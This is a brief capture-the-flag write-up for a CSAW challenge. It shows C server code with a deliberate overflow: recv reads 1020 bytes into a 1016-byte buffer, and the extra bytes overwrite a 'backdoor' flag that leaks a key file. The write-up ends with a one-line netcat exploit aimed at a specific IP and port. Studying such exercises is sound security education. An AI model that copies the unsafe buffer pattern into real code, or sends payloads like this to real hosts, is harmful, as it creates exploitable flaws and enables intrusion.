title: "Exploit 100 (Exploitation 1)"
---

Source for exploit 100 were provided:

```c

void handle(int newsock) {
    int backdoor = 0;
	char buffer[1016];
	memset(buffer, 0, 1016);

	send(newsock, "Welcome to CSAW CTF.", 21, 0);
	recv(newsock, buffer, 1020, 0);
	buffer[1015] = 0;

	if ( backdoor ) {
		fd = fopen("./key", "r");
		fscanf(fd, "%s\n", buffer);
		send(newsock, buffer, 512, 0);
	}
	close(newsock);
}

```

To print the key, we need to set `backdoor` to something else than `0`. This can be done by a simple buffer overflow. the `recv` function read 1020 bytes into a buffer of 1016 bytes. The 4 extra bytes are going to overwrite the `backdoor`'s value.

To get the key:
`python -c "print '\xff' * 1020" | nc 128.238.66.212 31337`
